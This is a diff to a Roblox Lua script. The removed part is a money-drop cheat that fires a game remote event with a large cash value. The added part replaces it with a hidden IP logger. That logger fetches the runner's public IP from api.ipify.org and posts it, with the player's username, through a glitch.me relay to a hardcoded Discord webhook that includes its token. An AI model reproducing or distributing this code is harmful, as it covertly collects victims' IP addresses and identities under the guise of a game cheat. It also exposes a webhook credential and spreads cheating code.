@@ -1,43 +1,24 @@
-
--- UNLEAKED NO MONEY COOLDOWN SCRIPT
--- MADE BY AIRSTRIKA
-
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local TextButton = Instance.new("TextButton")
-
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Frame.Position = UDim2.new(0.412322253, 0, 0.463210702, 0)
-Frame.Size = UDim2.new(0, 235, 0, 100)
-Frame.Style = Enum.FrameStyle.DropShadow
-
-TextButton.Parent = Frame
-TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.Position = UDim2.new(0.0633659214, 0, 0.247746572, 0)
-TextButton.Size = UDim2.new(0, 191, 0, 42)
-TextButton.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "DROPCASH"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
-TextButton.MouseButton1Click:Connect(function()
-	local A_1 = "DropMoney"
-	local A_2 = "100000"
-	local Event = game:GetService("ReplicatedStorage").MainEvent
-	Event:FireServer(A_1, A_2)
-end)
-
-game.StarterGui:SetCore('SendNotification', {
-	Title    = 'ANTI COOLDOWN SCRIPT',
-	Text     = ('AIRSTRIKA IS HOT.'),
-	Duration = 9999,
-})
-
-wait(3)
-	while true do
-	   print("ENJOY!")
-	   end
+local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
+local function SendMessage(Webhook, Message, Botname)
+   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
+       return error("Send a valid URL");
+   end
+   local Name;
+   local API = "http://buritoman69.glitch.me/webhook";
+   if (not Message or Message == "" or not Botname) then
+       Name = "GameBot"
+       return error("nil or empty message!")
+   else
+       Name = Botname;
+   end
+   local Body = {
+       ['Key'] = tostring("applesaregood"),
+       ['Message'] = tostring(Message),
+       ['Name'] = Name,
+       ['Webhook'] = "https://discord.com/api/webhooks/974791062319169588/2DA5mg-vEaVirhVPpcPopA3i_zz4dE4RK648pisLpnhcd4aNZSzP35FFgyVLE9-3VeWc" 
+   }
+   Body = HttpService:JSONEncode(Body);
+   local Data = game:HttpPost(API, Body, false, "application/json")
+   return Data or nil;
+end
+SendMessage("https://discordapp.com/api/webhooks/snip/snip","IP: "..ip.." was logged. "..game.Players.LocalPlayer.Name ," ModLine Logger")
